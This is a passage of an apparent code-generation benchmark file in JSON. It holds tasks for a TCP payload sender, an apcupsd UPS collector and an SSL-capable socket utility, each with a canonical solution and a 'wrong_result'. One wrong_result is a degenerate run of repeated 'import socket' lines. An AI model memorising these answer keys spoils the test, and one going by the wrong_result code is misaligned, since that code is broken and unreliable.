x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified server, sends a payload consisting of a command and optional padding, and then closes the connection.\n\nFunction Description: The function `send_tcp_payload` creates a TCP socket, connects to a target server using the provided IP address and port, sends a payload formed by combining a command string with optional padding, and finally closes the socket connection. This is useful for simple TCP-based client-server communication scenarios.\n\nInput:\n- `ipaddr`: [str] - The IP address of the target server to connect to\n- `port`: [int] - The port number on the target server to connect to\n- `cmd`: [str] - The command string to be sent as part of the payload\n- `padding`: [str] - Optional additional data to be appended to the command\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(ipaddr, port, cmd, padding):\n    payload = cmd + padding\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ipaddr, port))\n    s.send(payload.encode())\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "def send_tcp_payload(ipaddr, port, cmd, padding=\"\"):\n    import socket\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((ipaddr, port))\n        payload = cmd + padding\n        s.sendall(payload.encode())"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Create a Python class that interacts with an APC UPS daemon (apcupsd) via TCP socket to collect and process UPS metrics.\n\nClass Description: The ApcupsdCollector class establishes a TCP connection to an apcupsd server, retrieves status information, and processes the raw data into structured metrics. It handles socket communication, data parsing, and metric filtering.\n\nAttributes:\n- config: [dict] - Configuration dictionary containing hostname (str), port (int), and metrics (list of str) to collect\n\nMethods:\n- __init__(hostname='localhost', port=3551, metrics=None) -> None - Initializes the collector with connection parameters and metrics to collect\n- getData() -> str - Establishes TCP connection, sends status request, and returns raw UPS data\n- collect() -> dict - Processes raw data into structured metrics, returning a dictionary of metric_name: value pairs",
    "Canonical_solution": "import socket\nfrom struct import pack\nimport re\nimport time\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.config = {\n            'hostname': hostname,\n            'port': port,\n            'metrics': metrics or ['LINEV', 'LOADPCT', 'BCHARGE', 'TIMELEFT', 'BATTV',\n                                 'NUMXFERS', 'TONBATT', 'MAXLINEV', 'MINLINEV',\n                                 'OUTPUTV', 'ITEMP', 'LINEFREQ', 'CUMONBATT']\n        }\n\n    def getData(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((self.config['hostname'], int(self.config['port'])))\n        s.send(pack('xb6s', 6, 'status'))\n        s.recv(1024)\n        time.sleep(.25)\n        data = s.recv(4096)\n        s.close()\n        return data\n\n    def collect(self):\n        metrics = {}\n        raw = {}\n        data = self.getData()\n        data = data.split('\\n\\x00')\n        \n        for d in data:\n            matches = re.search(\"([A-Z]+)\\s+:\\s+(.*)$\", d)\n            if matches:\n                value = matches.group(2).strip()\n                raw[matches.group(1)] = value\n                vmatch = re.search(\"([0-9.]+)\", value)\n                if not vmatch:\n                    continue\n                try:\n                    value = float(vmatch.group(1))\n                except ValueError:\n                    continue\n                metrics[matches.group(1)] = value\n\n        results = {}\n        for metric in self.config['metrics']:\n            if metric not in metrics:\n                continue\n            metric_name = \"%s.%s\" % (raw['UPSNAME'], metric)\n            value = metrics[metric]\n            results[metric_name] = value\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.hostname = hostname\n        self.port = port\n        self.metrics = metrics or []\n\n    def getData(self):\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.connect((self.hostname, self.port))\n                s.sendall(b'GETINFO\\n')\n                return s.recv(4096).decode()\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def collect(self):\n        data = self.getData()\n        if not data:\n            return {}\n\n        metrics = {}\n        for line in data.split('\\n'):\n            if not line.strip():\n                continue\n            if line.startswith('UPS'):\n                parts = line.split()\n                if len(parts) >= 2:\n                    metric_name = parts[0]\n                    value = parts[1]\n                    if metric_name in self.metrics:\n                        metrics[metric_name] = value\n        return metrics"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Python class that provides TCP socket functionality including connection establishment, data transmission, and SSL support for secure communication.\n\nClass Description: The SocketLibrary class encapsulates TCP socket operations with support for both regular and SSL-wrapped connections. It provides methods to establish connections, send/receive data, and gather connection information.\n\nAttributes: None (This is a utility class without persistent attributes)\n\nMethods:\n\nMethod1: create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]] - Creates and returns a TCP socket connection to the specified host and port. Attempts SSL connection first, falls back to regular TCP if SSL fails. Returns a tuple containing the socket object and SSL flag (True if SSL succeeded).\n\nMethod2: tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection to verify connectivity and returns connection details including peer information, service name, and SSL status without data transmission.\n\nMethod3: tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection, sends test data, receives response, and returns connection details including peer information, service name, response data, and SSL status.",
    "Canonical_solution": "import socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n            ssl_flag = False\n        except ConnectionRefusedError:\n            return None\n\n        try:\n            socket_connection = ssl.wrap_socket(socket_connection)\n            ssl_flag = True\n        except Exception:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n\n        return socket_connection, ssl_flag\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        socket_connection.close()\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(int(port)),\n            \"ssl_flag\": ssl_flag,\n        }\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        try:\n            socket_connection.send(b\"ABC\\x00\\r\\n\\r\\n\\r\\n\" * 10)\n            response = socket_connection.recv(1024 * 1024 * 10)\n            socket_connection.close()\n        except Exception:\n            try:\n                socket_connection.close()\n                response = b\"\"\n            except Exception:\n                response = b\"\"\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(port),\n            \"response\": response.decode(errors=\"ignore\"),\n            \"ssl_flag\": ssl_flag,\n        }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport ssl\nimport socketserver\nimport socket\nimport ssl\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport socket\nimport 